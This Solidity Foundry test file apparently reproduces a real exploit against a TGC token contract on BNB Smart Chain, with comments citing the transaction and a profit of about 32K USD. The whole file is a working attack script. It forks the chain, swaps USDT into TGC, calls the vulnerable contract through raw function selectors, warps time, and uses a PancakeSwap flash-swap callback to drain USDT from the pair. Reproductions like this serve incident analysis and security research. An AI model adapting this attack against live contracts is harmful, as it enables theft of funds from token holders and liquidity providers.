// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// TX : https://app.blocksec.com/explorer/tx/bsc/0x12e8c24dec36a29fdd9b9d7a8b587b3abd2519089b6438c194e6e5eb357b68d8
// GUY : https://x.com/ChainAegis/status/1789490986588205529
// Profit : ~32K USD

contract ContractTest is Test {
    IWBNB WBNB = IWBNB(payable(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c));
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xBb33668bAe76A6394683DeEf645487e333b8fC45); 
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 TGC = IERC20(0x523aA213FE806778Ffa597b6409382fFfcc12De2);
    address vulnContract=0x32F9188d6D86Bf88dbAc3ceEe5958aDf1aa609df;
    function setUp() external {
        vm.createSelectFork("bsc", 38623654);
        deal(address(USDT), address(this), 200 ether);
    }

    function testExploit() external {

        emit log_named_decimal_uint("[Begin] Attacker USDT before exploit", USDT.balanceOf(address(this)), 18);
        attack();
        // emit log_named_decimal_uint("[End] Attacker TGC after exploit", TGC.balanceOf(address(this)), 18);
        swap_token_to_token(address(TGC),address(USDT),TGC.balanceOf(address(this)));

        emit log_named_decimal_uint("[End] Attacker USDT after exploit", USDT.balanceOf(address(this)), 18);
   

    }
    function attack() public {
        swap_token_to_token(address(USDT), address(TGC), 100 ether);
        approveAll();
        address(vulnContract).call(abi.encodeWithSelector(bytes4(0x836aefb0),100000000000000000000));
        vm.warp(block.timestamp + 5 hours);
        // emit log_named_decimal_uint("Pair USDT balance", USDT.balanceOf(address(Pair)), 18);
        // emit log_named_decimal_uint("address(this) TGC balance", TGC.balanceOf(address(vuln)), TGC.decimals());
        Pair.swap(0, 29809 ether , address(this), new bytes(0x31));
    }
    function pancakeCall(address sender, uint amount0, uint amount1, bytes calldata data) external {
        address(vulnContract).call(abi.encodeWithSelector(bytes4(0xfd5a466f)));
        USDT.transfer(address(Pair), 29809 ether);
        TGC.transfer(address(Pair), 80 ether);
    }
    function swap_token_to_token(address a,address b,uint256 amount) internal {
        IERC20(a).approve(address(Router), amount);
        address[] memory path = new address[](2);
        path[0] = address(a);
        path[1] = address(b);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            amount, 0, path, address(this), block.timestamp
        );
    }
    function approveAll() internal {
        TGC.approve(address(vulnContract), type(uint256).max);
    }

       function getreserves(uint256 stepNum) public {
        console.log("Step %i", stepNum);
        (uint256 reserveIn, uint256 reserveOut,) = Pair.getReserves();
        emit log_named_decimal_uint("ReserveIn", reserveIn, 18);
        emit log_named_decimal_uint("ReserveOut", reserveOut, 18);
    }
}